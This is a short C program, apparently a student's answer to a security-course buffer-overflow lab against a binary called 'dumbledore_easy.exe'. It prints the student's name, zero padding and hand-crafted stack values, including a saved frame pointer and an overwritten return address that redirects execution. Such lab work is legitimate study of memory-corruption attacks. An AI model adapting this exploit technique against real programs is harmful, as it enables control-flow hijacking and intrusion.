// Wright Kim
// wdk7bj
// ./dumbledore_easy.exe

#include <stdio.h>
#include <string.h>

char attackString[] = "Wright Kim";

int main(){
	int i;
	// "Wright Kim"
	char *p = attackString;
	// padding buffer with 0x00
	unsigned char zero = 0x00;
	// $ebp - 12
	unsigned char m1[] = {0x07,0x00,0x00,0x00};
	// $ebp - 8
	unsigned char m2[] = {0x01,0x00,0x00,0x00};
	// $ebp - 4, mprotect
	unsigned char mp[] = {0x79,0x2e,0x12,0x40};
	// $ebp, saved ebp
	unsigned char ebp[] = {0x08,0xf0,0xff,0xbf};
	// $ebp + 4, to overwrite return address
	// 0x80485a6 movb $0x41, 0x804a02c
	unsigned char ret[] = {0xa6,0x85,0x04,0x08};
	// $ebp + 8, variable "name"
	unsigned char name[] = {0x80,0xa0,0x04,0x08};
	
	// putchar from top of the stack to $ebp + 8
	// "Wright Kim"
	for(i = 0; i < sizeof(attackString); i++){
		putchar(*p);
		p++;
	}
	// pad 0x00
	for(i = 0; i < 87; i++){
		putchar(zero);
	}
	// $ebp - 12
	for(i = 0; i < 4; i++){
		putchar(m1[i]);
	}
	// $ebp - 8
	for(i = 0; i < 4; i++){
		putchar(m2[i]);
	}
	// $ebp - 4
	for(i = 0; i < 4; i++){
		putchar(mp[i]);
	}
	// $ebp
	for(i = 0; i < 4; i++){
		putchar(ebp[i]);
	}
	// $ ebp + 4 (ret addr)
	for(i = 0; i < 4; i++){
		putchar(ret[i]);
	}
	// $ebp + 8 (name)
	for(i = 0; i < 4; i++){
		putchar(name[i]);
	}
	
	return 1;
}
